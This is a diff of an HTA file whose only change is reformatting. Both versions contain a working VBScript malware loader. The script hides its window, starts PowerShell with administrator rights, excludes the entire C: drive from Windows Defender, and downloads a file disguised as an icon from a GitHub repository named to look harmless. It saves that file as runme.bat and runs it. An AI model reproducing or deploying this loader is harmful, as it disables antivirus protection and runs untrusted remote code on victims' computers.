@@ -1,18 +1,29 @@
-<HTML><HEAD>
-<HTA:APPLICATION ID="mshtar" MAXIMIZEBUTTON="no" border="thin" showInTaskbar="no" innerBorder="no" reseize="no" scroll="no" singleInstance="yes" selection="no" version="1.0" />
-<TITLE>mshta</TITLE>
-</HEAD>
-<script type="text/vbscript">
-On Error Resume Next
-Window.ReSizeTo 0, 0
-Window.MoveTo -4000, -4000
-Set objShell = CreateObject("Shell.Application")
-Set objScriptExec = objShell.ShellExecute("powershell.exe", "Add-MpPreference -ExclusionPath C:\ ; Invoke-WebRequest -Uri https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-medium.ico -OutFile C:\Users\Public\runme.bat ; start C:\Users\Public\runme.bat", "", "runas", 1) ' Set the last parameter to 0 for hidden
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c C:\Users\Public\runme.bat", 1, False
-Set objShell = Nothing
-On Error GoTo 0
-</script>
-<BODY>
-</BODY>
-</HTML>
+<!DOCTYPE html>
+<html>
+<head>
+    <hta:application id="mshtar" 
+        maximizebutton="no"
+        border="thin"
+        showintaskbar="no"
+        innerborder="no"
+        resizable="no"
+        scroll="no"
+        singleinstance="yes"
+        version="1.0"
+    />
+    <title>mshta</title>
+    <script type="text/vbscript">
+	On Error Resume Next
+	Window.ReSizeTo 0, 0
+	Window.MoveTo -4000, -4000
+	Set objShell = CreateObject("Shell.Application")
+	Set objScriptExec = objShell.ShellExecute("powershell.exe", "Add-MpPreference -ExclusionPath C:\ ; Invoke-WebRequest -Uri https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-medium.ico -OutFile C:\Users\Public\runme.bat ; start C:\Users\Public\runme.bat", "", "runas", 1) ' Set the last parameter to 0 for hidden
+	Set objShell = CreateObject("WScript.Shell")
+	objShell.Run "cmd.exe /c C:\Users\Public\runme.bat", 1, False
+	Set objShell = Nothing
+	On Error GoTo 0
+    </script>
+</head>
+<body>
+</body>
+</html>
